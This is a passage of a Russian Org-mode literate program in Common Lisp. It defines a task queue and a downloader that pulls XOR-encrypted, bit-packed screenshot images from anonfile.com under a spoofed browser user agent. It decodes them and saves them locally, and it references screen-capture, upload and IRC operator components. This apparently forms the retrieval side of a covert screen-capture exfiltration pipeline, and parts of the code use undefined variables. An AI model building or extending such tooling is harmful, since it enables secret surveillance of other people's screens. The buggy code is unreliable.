особенно когда мы хотим запускать скачку паралельно, в несколько
потоков.

Чтобы отвязать запуск потоков от системы правил мы будем использовать
очередь, в которую будем добавлять задания на обработку. Преимуществом
такого подхода может быть возможность ссылаться на ранее выполнявшиеся
задания.

Структуру задания определим так:

#+NAME: task
#+BEGIN_SRC lisp
  (defstruct task
    class
    data
    code)
#+END_SRC

Для обслуживания очереди нам понадобится сама очередь и блокировка на
ней:

#+NAME: task_queue
#+BEGIN_SRC lisp
  (defparameter *task-queue* nil)
  (defparameter *task-queue-lock* (bt:make-lock "task-queue-lock"))
#+END_SRC

Теперь можно добавить операции для добавления и удаления из очереди
заданий.

#+NAME: task_queue_ops
#+BEGIN_SRC lisp
  (defun ins-task (task)
    (bt:with-lock-held (*task-queue-lock*)
      (setf *task-queue*
            (append *task-queue*
                    (list task)))))

  (defun pop-task ()
    (bt:with-lock-held (*task-queue-lock*)
      (pop *task-queue*)))

  (defun length-of-queue ()
    (bt:with-lock-held (*task-queue-lock*)
      (length *task-queue*)))
#+END_SRC

Теперь соединим все вместе

[TODO:gmm] Надо еще добавить менеджер очередей в отдельном потоке,
который разбирает и выполняет задачи.

#+NAME: queues
#+BEGIN_SRC lisp :noweb yes
  <<task>>
  <<task_queue>>
  <<task_queue_ops>>
#+END_SRC

** Task Function

Эта функция вызывается каждый раз, когда нужно обработать задачу из
очереди. Она получает задачу в переменной ~current-task~.

Сейчас ей остается только вызвать ~shot-downloader~, передав ему
параметры из задачи.

#+NAME: task_function
#+BEGIN_SRC lisp :noweb yes
  <<shot_downloader>>

  (defun task ()
    (destructuring-bind (str src)
        (task-data *current-task*)
      (dbg ":: TASK FUNCTION (~A): ~A | ~A~%"
           (length-of-queue) str src)))
#+END_SRC

** Shot Downloader

Однако, необходимо описать операцию, которая будет вызываться из таска и
выполнять всю грязную работу.

#+NAME: shot_downloader
#+BEGIN_SRC lisp :noweb yes
  ;; anon_file_download
  <<anon_file_download>>

  ;; seq_xor
  <<seq_xor>>

  ;; decrypt
  <<decrypt>>

  ;; unpack_img
  <<unpack_img>>

  (defun shot-downloader (param)
    (let* ((key (parse-integer (subseq src 1)))
           (enc (anon-file-download str))
           (dec (decrypt enc key))
           (png (let ((png-read::*png-file* "fake-file"))
                  (flex:with-input-from-sequence (stream dec)
                    (png-read:read-png-datastream stream))))
           (image-data (png-read:image-data png))
           ;; reverse
           (dims   (subseq (array-dimensions image-data) 0 2))
           (height (cadr dims))
           (width  (car  dims))
           (image ;; меняем размерности X и Y местами
            (let ((result (make-array (list height width)
                                      :element-type '(unsigned-byte 8))))
              (do ((y 0 (incf y)))
                  ((= y height))
                (do ((x 0 (incf x)))
                    ((= x width))
                  (setf (aref result y x)
                        (aref image-data x y))))
              result))
           ;; (dif (ppcre:scan-to-strings "/(.*)/([0-9]*)_([0-9]*)" str))
           ;; (img (if (not dif)
           ;;          (setf prev image)
           ;;          ;; else
           ;;          (setf prev (get-img-diff dims prev image))))
           (img image)
           ;; unpacking
           (unpack (unpack-img img))
           (unpack-dims (array-dimensions unpack))
           (new-width (cadr unpack-dims))
           (fname-str (multiple-value-bind (match-p result)
                          (ppcre:scan-to-strings "/.*/(.*)" str)
                        (elt result 0))))
      (format t "~%~A" fname-str)
      (let* ((png (make-instance 'zpng:png
                                 :width new-width
                                 :height height
                                 :color-type :grayscale))
             (vector (make-array ;; displaced vector - need copy for save
                      (* height new-width (zpng:samples-per-pixel png))
                      :displaced-to unpack :element-type '(unsigned-byte 8))))
        ;; Тут применен потенциально опасный трюк, когда мы создаем
        ;; объект PNG без данных, а потом добавляем в него данные,
        ;; используя неэкспортируемый writer.
        ;; Это нужно чтобы получить третью размерность массива,
        ;; который мы хотим передать как данные и при этом
        ;; избежать создания для этого временного объекта
        (setf (zpng::%image-data png) (copy-seq vector))
        (zpng:write-png png (format nil "~~/Documents/~A" fname-str)))
      t))
#+END_SRC
** Anon File Download

#+NAME: anon_file_download
#+BEGIN_SRC lisp :noweb yes
  (defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

  (defparameter *additional-headers*
    `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
      ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
      ("Accept-Charset" . "utf-8")))

  (defun get-download-link (text)
    (loop :for str :in (split-sequence:split-sequence #\Newline text)
       :do (multiple-value-bind (match-p result)
               (ppcre:scan-to-strings
                "(https://cdn-([0-9]*)\.anonfile.com\/(.*))\\\""
                str)
             (when match-p (return (aref result 0))))))

  (defun anon-file-download (filename)
    (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
      ;; load mainpage for cookies, headers and csrf
      (multiple-value-bind (body-or-stream ;; status-code headers uri
                            ;;stream must-close reason-phrase
                            )
          (drakma:http-request (format nil "https://anonfile.com~A" filename)
                               :user-agent *user-agent*
                               :redirect 10
                               :force-binary t
                               :cookie-jar cookie-jar
                               :additional-headers *additional-headers*)
        (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
               (link (get-download-link text)))
          (multiple-value-bind (body-or-stream ;; status-code headers uri
                                ;;stream must-close reason-phrase
                                )
              (drakma:http-request link
               :user-agent *user-agent*
               :cookie-jar cookie-jar
               :additional-headers *additional-headers*
               :force-binary t)
            (flex:octets-to-string body-or-stream :external-format :utf-8))))))
#+END_SRC

** Unpack image

#+NAME: unpack_img
#+BEGIN_SRC lisp
  (defun unpack-img (image)
    (declare (optimize (speed 3) (safety 0)))
    (let* ((dims (array-dimensions image))
           (height (car dims))
           (width (cadr dims))
           (new-width (ash width 3))
           (result (make-array (list height new-width)
                               :element-type '(unsigned-byte 8))))
      (declare (type fixnum width)
               (type fixnum new-width)
               (type fixnum height))
      (do ((qy 0 (incf qy)))
          ((= qy height))
        (declare (type fixnum qy))
        (do ((qx 0 (incf qx)))
            ((= qx width))
          (declare (type fixnum qx))
          (let ((acc (aref image qy qx)))
            (declare (type (unsigned-byte 8) acc))
            ;; (format t "~8,'0B" acc)
            (do ((out 0 (incf out))
                 (in  7 (decf in)))
                ((= 8 out))
              (declare (type fixnum out in))
              (unless (= 0 (logand acc (ash 1 in)))
                (setf (aref result qy (logior (ash qx 3) out))
                      255)))))
        ;; (format t "~%")
        )
      result))

  ;; TEST
  ;; (print
  ;;  (unpack-img
  ;;   (pack-img
  ;;    (x-snapshot :width 31 :height 23))))

  ;; TEST
  ;; (time
  ;;  (let* ((image  (load-png "FILE1088"))
  ;;         (unpack (unpack-img image))
  ;;         (dims (array-dimensions unpack)))
  ;;    (save-png (cadr dims)
  ;;              (car dims)
  ;;              (format nil "~A" (gensym "FILE"))
  ;;              unpack
  ;;              :grayscale)))
#+END_SRC

* Utils

#+NAME: debug
#+BEGIN_SRC lisp
  (defparameter *outlock* (bt:make-recursive-lock "output-lock"))

  (defmacro bprint (var)
    `(subseq (with-output-to-string (*standard-output*)
               (pprint ,var)) 1))

  (defmacro dbg (msg &rest params)
    "debug output with lock"
    `(bt:with-recursive-lock-held (*outlock*)
       (format t ,msg ,@params)
       (finish-output)))
#+END_SRC

* Old

#+NAME:
#+BEGIN_SRC lisp
  <<anon_file_upload>>
  <<unpack_img>>

  (defun save-png (width height pathname-str image
                   &optional (color-type :truecolor-alpha))
    (let* ((png (make-instance 'zpng:png :width width :height height
                               :color-type color-type))
           (vector (make-array ;; displaced vector - need copy for save
                    (* height width (zpng:samples-per-pixel png))
                    :displaced-to image :element-type '(unsigned-byte 8))))
      ;; Тут применен потенциально опасный трюк, когда мы создаем
      ;; объект PNG без данных, а потом добавляем в него данные,
      ;; используя неэкспортируемый writer.
      ;; Это нужно чтобы получить третью размерность массива,
      ;; который мы хотим передать как данные и при этом
      ;; избежать создания для этого временного объекта
      (setf (zpng::%image-data png) (copy-seq vector))
      (zpng:write-png png pathname-str)))

#+END_SRC

** Save and Load

Для целей отладки нам нужно уметь сохранять и загружать png-изображения

#+NAME: save_and_load_png
#+BEGIN_SRC lisp
  ;; DEPRECATED, use explicit saving png-sequence by with-open-file
  ;; (defun save-png (pathname-str png)
  ;;   (zpng:write-png png pathname-str))

  (defun load-png (pathname-str)
    "Возвращает массив size-X столбцов по size-Y точек,
       где столбцы идут слева-направо, а точки в них - сверху-вниз
       ----
       В zpng есть указание на возможные варианты COLOR:
       ----
             (defmethod samples-per-pixel (png)
               (ecase (color-type png)
                 (:grayscale 1)
                 (:truecolor 3)
                 (:indexed-color 1) ;; НЕ ПОДДЕРЖИВАЕТСЯ
                 (:grayscale-alpha 2)
                 (:truecolor-alpha 4)))
      "
    (let* ((png (png-read:read-png-file pathname-str))
           (image-data (png-read:image-data png))
           (color (png-read:colour-type png))
           (dims (cond ((or (equal color :truecolor-alpha)
                            (equal color :truecolor))
                        (list (array-dimension image-data 1)
                              (array-dimension image-data 0)
                              (array-dimension image-data 2)))
                       ((or (equal color :grayscale)
                            (equal color :greyscale))
                        (list (array-dimension image-data 1)
                              (array-dimension image-data 0)))
                       (t (error 'unk-png-color-type :color color))))
           (result ;; меняем размерности X и Y местами
            (make-array dims :element-type '(unsigned-byte 8))))
      ;; (dbg "~% new-arr ~A "(array-dimensions result))
      ;; ширина, высота, цвет => высота, ширина, цвет
      (macrolet ((cycle (&body body)
                   `(do ((y 0 (incf y)))
                        ((= y (array-dimension result 0)))
                      (do ((x 0 (incf x)))
                          ((= x (array-dimension result 1)))
                        ,@body))))
        (cond ((or (equal color :truecolor-alpha)
                   (equal color :truecolor))
               (cycle (do ((z 0 (incf z)))
                          ((= z (array-dimension result 2)))
                        (setf (aref result y x z)
                              (aref image-data x y z)))))
              ((or (equal color :grayscale)
                   (equal color :greyscale))
               (cycle (setf (aref result y x)
                            (aref image-data x y))))
              (t (error 'unk-png-color-type :color color)))
        result)))
#+END_SRC

** Bit-vector operations

Для целей отладки определим операции кодирования в битовый вектор и
обратно

#+NAME: bit_vector
#+BEGIN_SRC lisp
  (defun bit-vector->integer (bit-vector)
    "Create a positive integer from a bit-vector."
    (reduce #'(lambda (first-bit second-bit)
                (+ (* first-bit 2) second-bit))
            bit-vector))

  (defun integer->bit-vector (integer)
    "Create a bit-vector from a positive integer."
    (labels ((integer->bit-list (int &optional accum)
               (cond ((> int 0)
                      (multiple-value-bind (i r) (truncate int 2)
                        (integer->bit-list i (push r accum))))
                     ((null accum) (push 0 accum))
                     (t accum))))
      (coerce (integer->bit-list integer) 'bit-vector)))
#+END_SRC

** Binarization

Получение черно-белого изображения или в градациях серого из
полноцветного.

Здесь остается пространство для оптимизаций путем применения
SIMD-операций.

#+NAME: binarization
#+BEGIN_SRC lisp
  (defun binarization (image &optional threshold)
    (let* ((dims (array-dimensions image))
           (new-dims (cond ((equal 3 (length dims))  (butlast dims))
                           ((equal 2 (length dims))  dims)
                           (t (error 'binarization-error))))
           (result (make-array new-dims :element-type '(unsigned-byte 8))))
      (macrolet ((cycle (&body body)
                   `(do ((y 0 (incf y)))
                        ((= y (array-dimension image 0)))
                      (do ((x 0 (incf x)))
                          ((= x (array-dimension image 1)))
                        ,@body))))
        (cond ((equal 3 (length dims))
               (cycle (do ((z 0 (incf z)))
                          ((= z (array-dimension image 2)))
                        (let ((avg (floor (+ (aref image y x 0)
                                             (aref image y x 1)
                                             (aref image y x 2))
                                          3)))
                          (when threshold
                            (if (< threshold avg)
                                (setf avg 255)
                                (setf avg 0)))
                          (setf (aref result y x) avg)))))
              ((equal 2 (length dims))
               (cycle (let ((avg (aref image y x)))
                        (when threshold
                          (if (< threshold avg)
                              (setf avg 255)
                              (setf avg 0)))
                        (setf (aref result y x) avg))))
              (t (error 'binarization-error))))
      result))

  ;; TEST: binarize and save screenshot
  ;; (let* ((to   "x-snapshot-binarize.png")
  ;;        (image-data (binarization (x-snapshot) 127))) ;; NEW: threshold!
  ;;   (destructuring-bind (height width) ;; NB: no depth!
  ;;       (array-dimensions image-data)
  ;;     (save-png width height to image-data :grayscale))) ;; NB: grayscale!


  ;; TEST: binarize get png and save
  ;; (print
  ;;  (let* ((image-data (binarization (x-snapshot) 127))) ;; NEW: threshold!
  ;;    (destructuring-bind (height width) ;; NB: no depth!
  ;;        (array-dimensions image-data)
  ;;      (let ((seq (get-png width height image-data :grayscale)))
  ;;        (with-open-file (file-stream "tee.png"
  ;;                                     :direction :output
  ;;                                     :if-exists :supersede
  ;;                                     :if-does-not-exist :create
  ;;                                     :element-type '(unsigned-byte 8))
  ;;          (write-sequence seq file-stream))))))
#+END_SRC

** Bit-image

Упаковка бинаризованного черно-белого изображения в битовый массив

#+NAME: make_bit_image
#+BEGIN_SRC lisp
  (defun make-bit-image (image-data)
    (destructuring-bind (height width &optional colors)
        (array-dimensions image-data)
      ;; функция может работать только с бинарными изобажениями
      (assert (null colors))
      (let* ((new-width (+ (logior width 7) 1))
             (bit-array (make-array (list height new-width)
                                    :element-type 'bit
                                    :initial-element 1)))
        (do ((qy 0 (incf qy)))
            ((= qy height))
          (do ((qx 0 (incf qx)))
              ((= qx width))
            ;; если цвет пикселя не белый, считаем,
            ;; что это не фон и заносим в битовый массив 1
            (if (equal (aref image-data qy qx) 255)
                (setf (bit bit-array qy qx) 1)
                (setf (bit bit-array qy qx) 0))))
        bit-array)))

  ;; TEST: make-bit-image
  ;; (print
  ;;  (make-bit-image
  ;;   (binarization (x-snapshot :x 0 :y 0 :width 30 :height 30) 127)))
#+END_SRC

* Assembly

#+NAME:
#+BEGIN_SRC lisp :tangle q.lisp :noweb yes
  (ql:quickload "anaphora")
  (use-package :anaphora)
  (ql:quickload "bordeaux-threads")
  (ql:quickload "clx")
  (ql:quickload "zpng")
  (ql:quickload "png-read")
  (ql:quickload "drakma")
  (ql:quickload "cl-ppcre")
  (ql:quickload "cl-base64")
  (ql:quickload "prbs")
  (ql:quickload "cl-irc")
  (ql:quickload "cl-json")
  (ql:quickload "ironclad")

  <<supervisor>>
#+END_SRC

#+NAME:
#+BEGIN_SRC lisp :tangle o.lisp :noweb yes
  (ql:quickload "anaphora")
  (use-package :anaphora)
  (ql:quickload "bordeaux-threads")
  (ql:quickload "clx")
  (ql:quickload "zpng")
  (ql:quickload "png-read")
  (ql:quickload "drakma")
  (ql:quickload "cl-ppcre")
  (ql:quickload "cl-base64")
  (ql:quickload "prbs")
  (ql:quickload "cl-irc")
  (ql:quickload "cl-json")
  (ql:quickload "ironclad")

  <<operator_loop>>
#+END_SRC
